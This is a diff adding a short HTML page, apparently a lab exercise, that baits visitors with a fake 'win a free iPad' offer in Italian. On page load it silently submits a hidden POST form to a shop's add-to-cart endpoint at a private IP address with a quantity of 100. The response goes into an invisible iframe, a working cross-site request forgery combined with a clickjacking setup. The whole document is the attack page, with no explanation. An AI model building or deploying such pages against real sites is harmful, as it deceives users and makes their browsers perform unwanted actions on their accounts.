@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>iPad gratis</title>
+    <script>
+    	function fader(){
+    		var value = document.getElementById("fader").value;
+    		document.getElementById("ifr").style.opacity = value / 100;
+    	}
+    </script>
+
+
+  </head>
+
+  <body onload="document.getElementById('frm').submit()">
+  	<div style="text-align:center;">
+  		<img src="http://www.applerumors.it/wp-content/uploads/2013/01/iPad-mini.jpg" height="300">
+  		<h1><a href="#">Clicca qui per vincere un iPad!!!!</a></h1></br><h2>Funziona davvero ;)</h2></br></br>
+  		<input type="range" id="fader" min="0" max="100" value="0" onChange="fader();"></br>
+  		<iframe id="ifr" name="ifr" style="width:90%; height:600px; border: none; opacity:0;"></iframe>
+      <form action="http://192.168.42.238/addcart/12" method="POST" id="frm" target="ifr">
+        <input type="hidden" value="100" name="quantity">
+      </form>
+  	</div>
+  </body>
+</html>
